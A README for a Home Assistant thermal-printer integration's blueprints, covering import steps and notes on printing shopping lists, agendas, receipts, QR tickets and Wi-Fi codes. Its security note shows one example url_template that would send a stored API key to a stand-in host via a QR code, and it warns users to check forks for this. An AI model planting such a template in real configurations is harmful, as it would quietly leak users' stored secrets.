# Blueprints for ha-escpos-thermal-printer

Ready-to-import [Home Assistant blueprints](https://www.home-assistant.io/docs/blueprint/) — automations and scripts that exercise the integration's services for common day-to-day workflows. Pick one, click *Import*, fill in your printer and a few inputs, and it runs.

## How to import

The fastest way is to click the **Import** badge next to a blueprint in the table below — it opens HA's import dialog with the URL pre-filled. (The badges use the [`my.home-assistant.io`](https://my.home-assistant.io/) redirect, which Home Assistant Companion handles on phones and the desktop browser does on laptops.)

Manual import works too:

1. In Home Assistant, go to **Settings → Automations & Scenes**.
2. Switch to the **Blueprints** tab.
3. Click **Import Blueprint** in the bottom-right.
4. Paste the **raw GitHub URL** of the blueprint file (the blueprint name in the table below links to it).
5. *Import*. The blueprint is now available under "Create automation / script from blueprint."

## Available blueprints

| Blueprint | Type | Import | What it does |
|-----------|------|--------|--------------|
| [Shopping List](script/escpos_printer/shopping_list.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fshopping_list.yaml) | Print all open items from a `todo` entity as a bordered, tabulated shopping list. |
| [TODO List](script/escpos_printer/todo_list.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Ftodo_list.yaml) | Generic counterpart to *Shopping List* — any `todo` entity, optional completed items, optional numbering. |
| [Daily Agenda](automation/escpos_printer/daily_agenda.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fdaily_agenda.yaml) | At a fixed time each day, print today's calendar events as a time → event KV table. |
| [Weather Forecast](script/escpos_printer/weather_forecast.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fweather_forecast.yaml) | Print an N-day forecast as a Day / Hi / Lo / Condition table. |
| [Receipt](script/escpos_printer/receipt.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Freceipt.yaml) | Print a styled receipt — large serif header, line items, subtotal + tax + total. |
| [Recipe Card](script/escpos_printer/recipe_card.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Frecipe_card.yaml) | Print a kitchen-friendly recipe card with a serif name, servings, ingredients, and numbered steps. |
| [Sensor Alert](automation/escpos_printer/sensor_alert.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fsensor_alert.yaml) | When a sensor reaches a target state, print a bordered alert with its current value and a timestamp. |
| [TODO Item](automation/escpos_printer/todo_item.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftodo_item.yaml) | When items are added to a `todo` entity, print a small bordered card per new item. |
| [TODO Ticket (with QR)](automation/escpos_printer/todo_ticket.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftodo_ticket.yaml) | Upgraded TODO Item — prints a job-ticket-style slip per task with a large serif title, due date, description, and a QR code that opens the original task (Todoist by default; templatable for any back-end). |
| [Doorbell Snapshot](automation/escpos_printer/doorbell_snapshot.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fdoorbell_snapshot.yaml) | When a doorbell/motion sensor fires, print a captioned camera snapshot — title, the live frame, and a timestamp. |
| [Morning Briefing](automation/escpos_printer/morning_briefing.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fmorning_briefing.yaml) | At a fixed time each morning, print a combined slip — date header, weather forecast, today's agenda, and a templated footer line. Each section is optional. |
| [Trash & Recycling Reminder](automation/escpos_printer/trash_reminder.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftrash_reminder.yaml) | The night before pickup, print which bins go out tomorrow. Configure once per weekday — empty days are skipped. |
| [Guest Wi-Fi QR](script/escpos_printer/guest_wifi_qr.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fguest_wifi_qr.yaml) | Print a scannable Wi-Fi QR code (WPA/WEP/open) plus the SSID/password as fallback text. |

## Integration recipes

Deeper recipes for combining blueprints with specific HA integrations:

- **[UniFi Guest Wi-Fi](UNIFI_GUEST_WIFI.md)** — about 10 minutes of setup. If you already have the [official HA UniFi integration](https://www.home-assistant.io/integrations/unifi/) installed, this adds two Lovelace buttons (Print current / Rotate now) and a monthly auto-rotate. Reuses the credentials the integration already stored — no `.env` files, no extra helpers.

## Per-blueprint notes

### Shopping List

**Inputs:** printer · `todo_entity` · `title` (default "Shopping List") · `style`
**Requires:** the [Todo integration](https://www.home-assistant.io/integrations/todo/) (any provider — local, Google Tasks, etc.)
**Notes:** prints only items with status `needs_action`; if the list is empty it prints a "(nothing to buy)" box so you know the print succeeded.

### TODO List

**Inputs:** printer · `todo_entity` · `title` (auto from entity friendly name) · `include_completed` · `numbered` · `style`
**Use this over Shopping List when:** the entity isn't groceries (chores, packing, projects) or you want completed items / numbering. The two share the same underlying mechanism — Shopping List is the curated grocery preset.

### Daily Agenda

**Inputs:** printer · `calendar_entity` · `print_time` (default 07:00) · `lookahead_hours` · `max_title_length` · `style`
**Trigger:** time of day. Prints once per fire; if there are no events the table contains a single "No events today" row. `max_title_length` truncates long event names so they fit a narrow printer.

### Weather Forecast

**Inputs:** printer · `weather_entity` · `days` · `title` · `max_condition_length`
**Requires:** weather provider that supports `weather.get_forecasts` with `type: daily`. `max_condition_length` truncates the condition string (e.g. "partlycloudy") so the table fits.

### Receipt

**Inputs:** printer · `title` · `items` (list of `{name, price}`) · `currency` · `tax_rate`
**Notes:** subtotal/tax/total are computed automatically. Uses the bundled `dejavu_serif` font for the title. Line items render as a label/value table; an empty `items` list prints "(no items)" instead of an empty table.

### Recipe Card

**Inputs:** printer · `name` · `servings` · `ingredients` (one per line) · `steps` (one per line, auto-numbered) · `style`
**Notes:** ingredients and steps render as bordered tables (steps numbered in the left column). Empty blocks print "(no ingredients)" / "(no steps)" so the rest of the card still prints.

### Sensor Alert

**Inputs:** printer · `sensor` · `target_state` · `alert_title` · `style`
**Notes:** fires on transitions *into* `target_state`. To alert on *any* change, set `target_state` to a state that won't naturally match (e.g. `"__never__"`) and edit the trigger to drop the `to:` filter.

### TODO Item vs TODO Ticket — which one?

Both watch a `todo` entity and print when items get added. They differ on output:

| | **TODO Item** | **TODO Ticket** |
|---|---|---|
| Format | Small bordered card per item | Job-ticket slip: bold title + Due/List/Added KV table + optional description + optional QR back-link to the source task |
| Inputs | Minimal (5) | More (11) |
| Best for | "Mark items, get a slip — fridge-magnet aesthetic" | "I want to scan the QR back to Todoist and look at attachments / comments" |
| Diff key | `summary` (titles must be unique within the list) | `uid` (stable across renames) |
| Cuts per item | Yes (configurable) | Yes (configurable) |

Pick TODO Item if you just want minimal slips. Pick TODO Ticket if you use Todoist / CalDAV / Apple Reminders / Google Tasks and want a scannable QR back to the source task. Don't run both on the same todo entity simultaneously — they'd both fire on the same state change and produce duplicate prints.

### TODO Item

**Inputs:** printer · `todo_entity` · `style` · `max_items_per_trigger` · `cut_per_item`
**Notes:** HA does not fire per-item events for todo lists; the blueprint compares the entity's `items` attribute between the previous and current state and prints what's new. `max_items_per_trigger` is a safety cap against bulk-sync floods. `cut_per_item: false` keeps a batch of items on one slip with a single cut at the end.

### TODO Ticket (with QR)

**Inputs:** printer · `todo_entity` · `header_text` · `print_qr` · `url_template` · `qr_size` · `print_description` · `max_description_length` · `max_items_per_trigger` · `cut_per_item` · `style`
**Notes:** the richer counterpart to TODO Item — each new task prints as a job-ticket slip with a bold double-width title, a Due/List/Added KV table, optional description, and a QR code linking back to the source task. Pure text mode (no raster image commands) so it works on the widest set of ESC/POS printers including image-less Bluetooth POS-58 units. `url_template` is a Jinja template with `uid` / `summary` / `due` / `description` in scope; the default targets Todoist (`https://app.todoist.com/app/task/{{ uid }}`). For other back-ends:

- **Todoist:** keep the default (the HA Todoist integration exposes Todoist's task ID as `uid`).
- **CalDAV / Apple Reminders:** items expose a `uid` but the URL scheme is provider-specific — set `url_template` to your provider's deep-link pattern.
- **Google Tasks:** `uid` is the API ID; Google doesn't publish a stable deep-link, so either set `print_qr: false` or template a search URL like `https://tasks.google.com/embed/?source=ha&q={{ summary | urlencode }}`.
- **Local todo (HA-native list):** no per-item URLs — set `print_qr: false`.

The QR is skipped automatically if the item has no `uid`, so the same blueprint is safe across mixed back-ends.

**Security note — read before importing a third-party fork.** `url_template` is rendered with HA's full template scope, which includes `states.*` and (via `state_attr`) the contents of any helper or sensor in your installation. The defaults shipped with this repo only use the per-task variables `uid` / `summary` / `due` / `description`. A malicious fork could ship a default like `https://x.example/?d={{ states.input_text.openai_api_key }}` — the user wouldn't notice because the payload is encoded into a QR (humans don't read QRs, but their phones do). Before importing this blueprint from anywhere other than upstream, open the YAML and read the `url_template` default. If you only want the per-task variables and nothing else, leave the default in place; if you want a different URL pattern, set it to a plain string with `{{ uid }}` substitution and nothing else.

**Emoji caveat:** the blueprint renders task summaries in the printer's hardware text mode (codepage CP437 etc.), which does not include emoji glyphs. Tasks like "🛒 Groceries" will print the leading emoji as `?` and the rest fine. If you need emoji, either strip them in a `script:` wrapper before adding the task, or fork the blueprint to switch the title back to `print_text_image` with a custom emoji-capable TTF (`<config>/fonts/NotoColorEmoji.ttf` for example) — at the cost of requiring a printer that supports raster image commands.

### Doorbell Snapshot

**Inputs:** printer · `trigger_entity` · `target_state` · `camera_entity` · `title` · `rotation` · `dither` · `style`
**Notes:** fires on transitions *into* `target_state` (defaults to `"on"` — matches typical binary_sensor / motion / button entities). Uses `print_camera_snapshot` so the frame is captured live at print time. `dither: floyd-steinberg` works best for colour camera feeds; switch to `threshold` for cartoon overlays or text-heavy UIs. The snapshot service call carries `continue_on_error: true` so a camera that's offline / mid-reboot still produces a title + "From" / "Time" slip — you get *something* on paper rather than a silently-skipped automation. This blueprint inherently requires a printer that supports raster image commands.

### Morning Briefing

**Inputs:** printer · `print_time` (default 07:00) · `title` · `weather_entity` (optional) · `forecast_days` · `max_condition_length` · `calendar_entity` (optional) · `lookahead_hours` · `max_title_length` · `footer` · `style`
**Notes:** each section is conditional — leave the weather or calendar entity blank and the matching section is skipped. The `footer` input is a Jinja template (e.g. `"Sunrise {{ state_attr('sun.sun', 'next_rising') | as_timestamp | timestamp_custom('%H:%M', true) }}"`); leave blank to skip.

### Trash & Recycling Reminder

**Inputs:** printer · `print_time` (default 19:00) · `offset_days` (default 1 = tomorrow) · `title` · `monday`..`sunday` · `style`
**Notes:** fires every day at `print_time` and looks at the *target* weekday — `offset_days = 1` (default) gives the classic "night before pickup" pattern; `offset_days = 0` with an earlier `print_time` (06:30, say) gives a morning-of reminder. If the matching day input is empty, no print happens — so you can leave the off days blank and the reminder only fires on the days before pickup. Bin descriptions can be a single label ("Trash") or several ("Trash + Yard Waste").

### Guest Wi-Fi QR

**Inputs:** printer · `ssid` · `password` · `security` (WPA / WEP / nopass) · `hidden` · `title` · `qr_size` · `show_password`

**Setup guide:** [**GUEST_WIFI_QR.md**](GUEST_WIFI_QR.md) — ~2-minute quick start (works on any router), helper-backed credentials, automated rotation, format & limitations. For automatic monthly password rotation against a UniFi controller, see [UNIFI_GUEST_WIFI.md](UNIFI_GUEST_WIFI.md).

## Authoring or modifying blueprints

See [**AUTHORING.md**](AUTHORING.md) for the full guide. It covers:

- The drop-into-`<config>/blueprints/` workflow for private blueprints
- Key concepts (`!input` substitution, `mode:` placement, selectors, Jinja rendering)
- Minimal script + automation shapes
- Three-tier validation: HA's on-import check, generic `yamllint`, this repo's strict `validate_blueprints.py` service-call lint + markdown-bash extractor
- Sharing via raw GitHub URL and the `my.home-assistant.io` badge format
- Contributing back: file-layout convention, sanitiser chain, `print_text_utf8` vs `print_text`, the three places to add an entry alongside the new YAML
- Modifying an existing blueprint (fork or in-place)

Quickest starting point: pick the existing blueprint closest to what you want from the table above, copy it into `<config>/blueprints/<domain>/<your-author-slug>/<name>.yaml`, reload the blueprints page, and edit.
